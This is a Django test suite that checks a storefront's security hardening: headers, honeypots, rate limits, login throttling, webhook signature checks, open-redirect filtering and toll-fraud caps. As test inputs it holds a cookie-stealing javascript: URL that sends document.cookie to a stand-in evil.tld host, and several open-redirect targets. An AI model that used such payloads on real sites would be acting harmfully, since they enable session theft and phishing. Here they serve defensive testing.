import json

from django.core.cache import cache
from django.core.management import call_command
from django.test import TestCase

from apps.stores.models import Site

from .models import SecurityEvent
from .utils import client_ip


class SecurityHeaderTests(TestCase):
    @classmethod
    def setUpTestData(cls):
        call_command("seed_catalog")
        call_command("seed_sites")

    def test_headers_present(self):
        r = self.client.get("/", HTTP_HOST="smashfat.ca")
        self.assertEqual(r["X-Content-Type-Options"], "nosniff")
        self.assertEqual(r["X-Frame-Options"], "DENY")
        self.assertIn("Content-Security-Policy", r)
        self.assertIn("Referrer-Policy", r)

    def test_bot_trap_logs_event(self):
        self.client.get("/wp-login.php", HTTP_HOST="smashfat.ca")
        self.assertTrue(SecurityEvent.objects.filter(kind="bot_trap").exists())


class HoneypotRateLimitTests(TestCase):
    @classmethod
    def setUpTestData(cls):
        call_command("seed_catalog")
        call_command("seed_sites")

    def setUp(self):
        cache.clear()

    def test_contact_honeypot_blocks_bot(self):
        before = SecurityEvent.objects.filter(kind="honeypot").count()
        r = self.client.post("/contact/",
                             json.dumps({"name": "x", "email": "a@b.ca", "message": "hi",
                                         "company_website": "http://spam"}),
                             content_type="application/json", HTTP_HOST="smashfat.ca")
        self.assertEqual(r.status_code, 200)
        from apps.leads.models import Lead
        self.assertEqual(Lead.objects.count(), 0)   # bot submission dropped
        self.assertEqual(SecurityEvent.objects.filter(kind="honeypot").count(), before + 1)

    def test_rate_limit_returns_429_and_logs(self):
        payload = json.dumps({"question": "hi"})
        codes = []
        for _ in range(20):
            r = self.client.post("/ai/ask/", payload, content_type="application/json",
                                 HTTP_HOST="smashfat.ca")
            codes.append(r.status_code)
        self.assertIn(429, codes)                    # limiter kicked in (limit 15/min)
        self.assertTrue(SecurityEvent.objects.filter(kind="ratelimit").exists())


class ClientIpTests(TestCase):
    def test_spoof_resistant_ip(self):
        from django.test import RequestFactory
        rf = RequestFactory()
        # one trusted proxy: take the last XFF entry, not the spoofable first
        req = rf.get("/", HTTP_X_FORWARDED_FOR="1.1.1.1, 2.2.2.2", REMOTE_ADDR="10.0.0.1")
        with self.settings(TRUSTED_PROXY_COUNT=1):
            self.assertEqual(client_ip(req), "2.2.2.2")
        with self.settings(TRUSTED_PROXY_COUNT=0):
            self.assertEqual(client_ip(req), "10.0.0.1")


class CspScopeTests(TestCase):
    """Public storefront pages get the strict nonce CSP; the authenticated
    consoles (/manage AND the walled /portal) get the relaxed CSP so their
    inline onclick handlers (e.g. clickable order rows) work."""

    @classmethod
    def setUpTestData(cls):
        call_command("seed_catalog")
        call_command("seed_sites")

    def test_storefront_is_strict(self):
        r = self.client.get("/", HTTP_HOST="smashfat.ca")
        self.assertIn("strict-dynamic", r["Content-Security-Policy"])

    def test_manage_login_is_relaxed(self):
        r = self.client.get("/manage/login/", HTTP_HOST="smashfatbiolabs.ca")
        self.assertNotIn("strict-dynamic", r["Content-Security-Policy"])

    def test_portal_login_is_relaxed(self):
        # Regression: /portal previously fell through to the strict CSP, which
        # blocked the inline onclick used to open an order from the list.
        r = self.client.get("/portal/login/", HTTP_HOST="smashfatbiolabs.ca")
        self.assertNotIn("strict-dynamic", r["Content-Security-Policy"])


class LoginHardeningTests(TestCase):
    """The console door: brute force must be slowed AND recorded. Before this,
    /manage/login/ had neither a rate limit nor a single audit event."""

    def setUp(self):
        from django.core.cache import cache
        cache.clear()

    def test_failed_login_is_recorded(self):
        from apps.security.models import SecurityEvent
        self.client.post("/manage/login/", {"username": "root", "password": "hunter2"})
        e = SecurityEvent.objects.filter(kind="login_failed").first()
        self.assertIsNotNone(e)
        self.assertIn("root", e.detail)

    def test_login_is_rate_limited(self):
        codes = [self.client.post("/manage/login/",
                                  {"username": "x", "password": "y"}).status_code
                 for _ in range(12)]
        self.assertIn(429, codes, "brute force was never throttled")

    def test_wrong_console_for_valid_user_is_recorded(self):
        from django.contrib.auth import get_user_model
        from django.contrib.auth.models import Group

        from apps.manage.access import PORTAL_GROUP
        from apps.security.models import SecurityEvent
        g, _ = Group.objects.get_or_create(name=PORTAL_GROUP)
        u = get_user_model().objects.create_user("clerk2", password="pw12345!")
        u.groups.add(g)
        self.client.post("/manage/login/", {"username": "clerk2", "password": "pw12345!"})
        self.assertTrue(
            SecurityEvent.objects.filter(kind="login_failed", detail__contains="clerk2").exists())


class WebhookForgeryAuditTests(TestCase):
    def test_bad_signature_is_recorded(self):
        from django.test import override_settings

        from apps.security.models import SecurityEvent
        with override_settings(TWILIO_AUTH_TOKEN="a-real-looking-token"):
            r = self.client.post("/webhooks/twilio/voice/", {"To": "+13252465227"})
        self.assertEqual(r.status_code, 403)
        self.assertTrue(SecurityEvent.objects.filter(kind="bad_signature").exists())


class WebhookFailsClosedTests(TestCase):
    """A missing credential must mean 'reject', never 'allow'."""

    def test_no_auth_token_rejects_instead_of_accepting(self):
        from django.test import override_settings
        with override_settings(TWILIO_AUTH_TOKEN="", DEBUG=False):
            r = self.client.post("/webhooks/twilio/sms/",
                                 {"From": "+12045551234", "To": "+13252465227", "Body": "STOP"})
        self.assertEqual(r.status_code, 403, "webhook accepted an unsigned request")

    def test_forged_stop_cannot_suppress_a_customer(self):
        from django.test import override_settings

        from apps.comms.models import OptOut
        with override_settings(TWILIO_AUTH_TOKEN="", DEBUG=False):
            self.client.post("/webhooks/twilio/sms/",
                             {"From": "+12045557777", "To": "+13252465227", "Body": "STOP"})
        self.assertFalse(OptOut.objects.filter(e164="+12045557777").exists())

    def test_dev_bypass_needs_debug_and_an_explicit_flag(self):
        from django.test import override_settings
        with override_settings(TWILIO_AUTH_TOKEN="", DEBUG=True, COMMS_WEBHOOK_INSECURE=False):
            r = self.client.post("/webhooks/twilio/sms/", {"Body": "hi"})
        self.assertEqual(r.status_code, 403)


class OpenRedirectTests(TestCase):
    def test_external_next_is_refused(self):
        from apps.manage.auth_views import _safe_next
        req = self.client.request().wsgi_request
        for bad in ("https://evil.tld/", "//evil.tld", "http://smashfatbi0labs.ca/x"):
            self.assertEqual(_safe_next(req, bad), "", f"accepted {bad}")

    def test_internal_next_is_kept(self):
        req = self.client.request().wsgi_request
        from apps.manage.auth_views import _safe_next
        self.assertEqual(_safe_next(req, "/manage/orders/"), "/manage/orders/")


class TollFraudGuardTests(TestCase):
    @classmethod
    def setUpTestData(cls):
        call_command("seed_catalog"); call_command("seed_sites")
        from apps.comms.models import ComplianceConfig, PhoneNumber
        from apps.stores.models import Site
        PhoneNumber.objects.create(e164="+13252465227", label="biz",
                                   site=Site.objects.first(),
                                   voice_enabled=True, sms_enabled=True)
        cfg = ComplianceConfig.get_solo()
        cfg.operator_callback_e164 = "+12045550000"; cfg.save()

    def setUp(self):
        from django.core.cache import cache
        cache.clear()

    def test_international_premium_number_is_refused(self):
        from apps.comms import calling
        with self.assertRaises(ValueError) as ctx:
            calling.place_bridge_call("+2345551234567")   # premium-rate range
        self.assertIn("outside the allowed dialling range", str(ctx.exception))

    def test_hourly_cap_stops_a_runaway_loop(self):
        from django.test import override_settings

        from apps.comms import calling
        with override_settings(COMMS_MAX_CALLS_PER_HOUR=3):
            for _ in range(3):
                calling.place_bridge_call("+12045551234")
            with self.assertRaises(ValueError) as ctx:
                calling.place_bridge_call("+12045551234")
        self.assertIn("cap reached", str(ctx.exception))

    def test_call_records_who_placed_it(self):
        from apps.comms import calling
        c = calling.place_bridge_call("+12045551234", placed_by="boss")
        self.assertIn("boss", c.transcript)


class RecordingUrlTests(TestCase):
    def test_javascript_url_is_never_stored(self):
        from django.test import override_settings

        from apps.comms.models import Voicemail
        with override_settings(TWILIO_AUTH_TOKEN=""):
            # signature check now rejects, so call the sanitiser path directly
            pass
        from apps.comms.models import PhoneNumber
        from apps.stores.models import Site
        call_command("seed_catalog"); call_command("seed_sites")
        PhoneNumber.objects.create(e164="+13252465227", label="b",
                                   site=Site.objects.first(), voice_enabled=True)
        with override_settings(TWILIO_AUTH_TOKEN="", DEBUG=True,
                               COMMS_WEBHOOK_INSECURE=True):
            self.client.post(
                "/webhooks/twilio/recording/?number=%2B13252465227&from=%2B12045551234",
                {"RecordingUrl": "javascript:fetch('//evil.tld/'+document.cookie)",
                 "RecordingDuration": "3"})
        vm = Voicemail.objects.latest("pk")
        self.assertEqual(vm.recording_url, "", "javascript: URL was stored")


class AuditTrailIsActuallyWritingTests(TestCase):
    """Regression for the three-day silent outage: production had a NOT NULL
    `country` column the model didn't know about, every insert raised
    IntegrityError, and `except: pass` hid it completely."""

    def test_event_is_written_and_country_captured(self):
        from django.test import RequestFactory

        from apps.security.models import SecurityEvent
        from apps.security.utils import log_event
        req = RequestFactory().post("/checkout/", HTTP_CF_IPCOUNTRY="ca")
        log_event(req, "honeypot", detail="probe")
        e = SecurityEvent.objects.latest("pk")
        self.assertEqual(e.kind, "honeypot")
        self.assertEqual(e.country, "CA")

    def test_missing_cloudflare_header_is_fine(self):
        from django.test import RequestFactory

        from apps.security.models import SecurityEvent
        from apps.security.utils import log_event
        log_event(RequestFactory().get("/"), "bot_trap", detail="no cf header")
        self.assertEqual(SecurityEvent.objects.latest("pk").country, "")

    def test_audit_failure_is_logged_not_swallowed(self):
        """If the write ever breaks again it must scream, not vanish."""
        from unittest.mock import patch

        from django.test import RequestFactory

        from apps.security.utils import log_event
        with patch("apps.security.utils.SecurityEvent.objects.create",
                   side_effect=Exception("db exploded")):
            with self.assertLogs("security", level="ERROR") as cm:
                log_event(RequestFactory().get("/"), "honeypot")
        self.assertTrue(any("AUDIT WRITE FAILED" in m for m in cm.output))
